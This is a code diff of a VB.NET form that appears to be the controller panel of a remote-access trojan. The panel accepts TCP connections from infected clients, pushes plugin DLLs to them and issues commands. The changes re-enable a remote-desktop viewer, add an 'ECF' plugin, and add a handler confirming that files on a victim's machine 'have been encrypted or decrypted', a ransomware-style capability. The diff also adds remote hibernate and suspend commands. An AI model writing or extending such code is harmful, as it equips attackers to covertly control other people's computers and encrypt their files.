@@ -124,17 +124,19 @@ Public Class Form1
             serve.Start()
 
             Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
+
+
             Task.Factory.StartNew(Sub() AcceptAndRead(Context), CancellationToken.None, TaskCreationOptions.LongRunning)
 
             '   o.Start()
 
-            '  RDPViewer = New TcpListener(IPAddress.Any, NumericUpDown2.Value)
+            RDPViewer = New TcpListener(IPAddress.Any, NumericUpDown2.Value)
 
-            ' RDPViewer.Start()
+            RDPViewer.Start()
 
 
 
-            '  Task.Run(Sub() GetRDVClient())
+            Task.Run(Sub() GetRDVClient())
 
 
             '  Timer1.Start()
@@ -158,7 +160,7 @@ Public Class Form1
 
             AeroListView1.Items.Clear()
             CliSt.Clear()
-            '    RDPViewer.Stop()
+            RDPViewer.Stop()
             UcBtnExt1.BtnText = "Listen !"
 
 
@@ -264,10 +266,10 @@ Public Class Form1
 
 #Region "Client Checker"
     Public Shared TestBytes As Byte() = Encoding.Default.GetBytes("")
-    Public Async Sub CheckClient(ByVal k As TcpClient)
+    Public Sub CheckClient(ByVal k As TcpClient)
         While True
             Try
-                Await k.GetStream.WriteAsync(TestBytes, 0, TestBytes.Length)
+                k.GetStream.WriteAsync(TestBytes, 0, TestBytes.Length)
             Catch ex As Exception
                 For Each az As ListViewItem In AeroListView1.Items
                     If az.Text = k.Client.RemoteEndPoint.ToString Then
@@ -551,34 +553,34 @@ Public Class Form1
 
 
 
-                            If VT.ThreadState = ThreadState.Running Then
+                            ' If VT.ThreadState = ThreadState.Running Then
 
-                                Try
-                                    Dim o As String() = Split(Message, "|SP|")
-                                    ' Dim MM = New IO.MemoryStream(Encoding.Default.GetBytes(o(1)))
+                            'Try
+                            'Dim o As String() = Split(Message, "|SP|")
+                            ' Dim MM = New IO.MemoryStream(Encoding.Default.GetBytes(o(1)))
 
 
 
-                                    ' Dim iii As Image = bf.Deserialize(MM)
+                            ' Dim iii As Image = bf.Deserialize(MM)
 
-                                    Task.Run(Sub() SetImage(foorm.PictureBox1, o(1)))
-                                    'foorm.PictureBox1.Image = Image.FromStream(MM)
-                                    'iii
-                                    'Image.FromStream(MM)
+                            '      Task.Run(Sub() SetImage(foorm.PictureBox1, o(1)))
+                            '               '    'foorm.PictureBox1.Image = Image.FromStream(MM)
+                            'iii
+                            'Image.FromStream(MM)
 
-                                    'MM.Dispose()
-                                    GC.Collect()
-                                    GC.WaitForPendingFinalizers()
-                                Catch ex As Exception
-                                    VT.Abort()
+                            'MM.Dispose()
+                            'GC.Collect()
+                            '  GC.WaitForPendingFinalizers()
+                            '    Catch ex As Exception
+                            '   VT.Abort()
 
-                                End Try
+                            'End Try
 
-                            Else
-                                foorm.Label4.Text = AeroListView1.SelectedItems(0).Text
-                                foorm.Text = AeroListView1.SelectedItems(0).Text
-                                VT.Start()
-                            End If
+                            'Else
+                            '    foorm.Label4.Text = AeroListView1.SelectedItems(0).Text
+                            '       foorm.Text = AeroListView1.SelectedItems(0).Text
+                            '   VT.Start()
+                            'End If
 
                             '  GC.Collect()
                             '    GC.WaitForPendingFinalizers()
@@ -601,6 +603,9 @@ Public Class Form1
 
                             Task.Run(Sub() SetPROCINFO(Data))
 
+                        ElseIf message.EndsWith("CRYPTO|") Then
+                            Dim Chk As New Thread(Sub() EncDecChecker(Message))
+                            Chk.Start()
                         End If
 
 
@@ -630,10 +635,10 @@ Public Class Form1
 
 
     End Sub
-    Public Async Sub SetImage(ByVal P As PictureBox, ByVal l As String)
-        Dim pazeza As Byte() = Await Task.Run(Function() Encoding.Default.GetBytes(l))
+    Public Sub SetImage(ByVal P As PictureBox, ByVal l As String)
+        ' Dim pazeza As Byte() = Await Task.Run(Function() Encoding.Default.GetBytes(l))
+        Dim pazeza As Byte() = Encoding.Default.GetBytes(l)
         Dim MM = New IO.MemoryStream(pazeza)
-
 
 
         ' Dim iii As Image = bf.Deserialize(MM)
@@ -996,6 +1001,25 @@ Public Class Form1
     End Sub
 #End Region
 
+#Region "Encryption|Decrytion Checker"
+    Public Sub EncDecChecker(ByVal M As String)
+        If M.EndsWith("|DONE|CRYPTO|") Then
+
+            Dim o As String = M.Replace("|DONE|CRYPTO|", "")
+
+            MessageBox.Show("The file at : " & o & " has been encrypted or decrypted")
+
+        ElseIf M.EndsWith("|FAIL|CRYPTO|") Then
+
+            Dim o As String = M.Replace("|FAIL|CRYPTO|", "")
+
+
+            MessageBox.Show("The file at : " & o & " has not been encrypted or decrypted")
+        End If
+
+    End Sub
+#End Region
+
 
     Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
         Label2.Text = DateTime.Now.TimeOfDay.Hours & ":" & DateTime.Now.TimeOfDay.Minutes & ":" & DateTime.Now.TimeOfDay.Seconds
@@ -1024,7 +1048,8 @@ Public Class Form1
        "\PLUGINS\DSK.dll",
        "\PLUGINS\MSCT.dll",
        "\PLUGINS\VRSA.dll",
-       "\PLUGINS\IJCT.dll"
+       "\PLUGINS\IJCT.dll",
+       "\PLUGINS\ECF.dll"
     }
 
 
@@ -1038,6 +1063,7 @@ Public Class Form1
     Public PL_MSCT As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(7)))
     Public PL_VRSA As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(8)))
     Public PL_IJCT As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(9)))
+    Public PL_ECF As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(10)))
     '
 #End Region
 
@@ -1083,6 +1109,7 @@ Public Class Form1
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
+            AeroListView1.Items.Remove(AeroListView1.SelectedItems(0))
         End If
     End Sub
 
@@ -1203,7 +1230,7 @@ Public Class Form1
 
 
 
-            Dim o As String = "|SRDV|"
+            Dim o As String = RViewerForm.PictureBox1.Width & "||"  & RViewerForm.PictureBox1.Height &  "||" & "|SRDV|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
@@ -1633,6 +1660,28 @@ Public Class Form1
         End Using
 
 
+    End Sub
+
+    Private Async Sub HibernateToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HibernateToolStripMenuItem.Click
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|HBNT|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub SuspendToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SuspendToolStripMenuItem.Click
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|SPND|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
     End Sub
 
 
